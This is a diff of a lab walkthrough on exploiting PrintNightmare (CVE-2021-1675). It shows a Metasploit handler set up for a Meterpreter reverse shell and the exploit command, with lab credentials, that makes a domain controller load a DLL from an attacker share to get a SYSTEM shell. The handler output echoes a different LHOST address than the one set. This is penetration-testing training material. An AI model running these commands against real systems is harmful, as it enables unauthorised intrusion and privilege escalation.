@@ -51,7 +51,7 @@ Once the share is created and hosting our payload, we can use MSF to configure &
 
 #### Configuring & Starting MSF multi/handler
 
-```msfcon
+```shell
 [msf](Jobs:0 Agents:0) >> use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp PAYLOAD => windows/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225 LHOST => 10.3.88.114 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080 LPORT => 8080 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run [*] Started reverse TCP handler on 172.16.5.225:8080`
 ```
 
@@ -59,8 +59,9 @@ With the share hosting our payload and our multi handler listening for a connect
 
 #### Running the Exploit
 
-        shellsession
-`0xxNosystemisSafe@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll' [*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss] [+] Bind OK [+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL [*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Try 3... <SNIP>`
+```shell
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+```
 
 Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
 
